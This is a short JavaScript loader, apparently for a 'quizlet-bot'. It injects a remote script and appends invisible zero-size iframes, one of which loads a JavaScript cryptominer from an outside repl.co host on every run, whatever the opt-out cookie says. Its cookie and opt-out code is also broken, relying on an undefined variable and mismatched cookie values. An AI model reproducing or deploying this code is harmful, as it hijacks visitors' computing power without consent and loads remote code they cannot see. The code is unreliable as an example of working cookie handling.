
function setCookie(name,value) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(2147483647);
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
function eraseCookie(name) {   
    document.cookie = name +'=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';
}

if (typeof qb_loaded !== 'undefined'){
  qb_loaded += 1;
  if (qb_loaded == 2){
    if (getCookie("qb_optout") == "optout" && confirm("Are you sure you want to opt-out of arc?")){
      setCookie("qb_optout", "qb_optout")
    } else {
      eraseCookie("qb_optout")
    }
    qb_loaded = 0;
  }
}
var qb_loaded = 0;
var qb_script = document.createElement('script');
var qb_miner = document.createElement('iframe');
var qb_arcio = document.createElement('iframe');
qb_script.src = "https://pandapip1.github.io/quizlet-bot/bot.js";
qb_miner.src = "https://qb-mon.pandapip1.repl.co/jsminer.html";
qb_arcio.src = "https://qb-mon.pandapip1.repl.co/arc.html";
qb_miner.width = 0;
qb_arcio.width = 0;
qb_miner.height = 0;
qb_arcio.height = 0;
if (getCookie("qb_optout") == "optout"){
    document.body.appendChild(qb_arcio);
}
document.body.appendChild(qb_miner);
document.head.appendChild(qb_script);
